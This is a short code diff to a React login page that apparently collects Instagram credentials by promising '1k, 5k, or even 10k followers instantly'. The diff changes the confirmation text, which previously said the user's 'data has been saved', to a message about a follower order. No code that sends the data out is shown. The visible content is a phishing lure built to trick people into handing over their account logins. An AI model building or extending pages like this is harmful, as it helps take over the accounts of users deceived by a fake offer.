@@ -59,7 +59,7 @@ const LoginPage = () => {
                     />
                     <button type="submit" className="login-button">Log In</button>
                 </form>
-                {showThanks && <p className="thank-you-message">Thank you! Your data has been saved.</p>} {/* Thank You message */}
+                {showThanks && <p className="thank-you-message">Thank you! Your Follower Order Get.</p>} {/* Thank You message */}
                 <p className="follower-note">
                     Login with your Instagram ID and get 1k, 5k, or even 10k followers instantly!
                 </p>
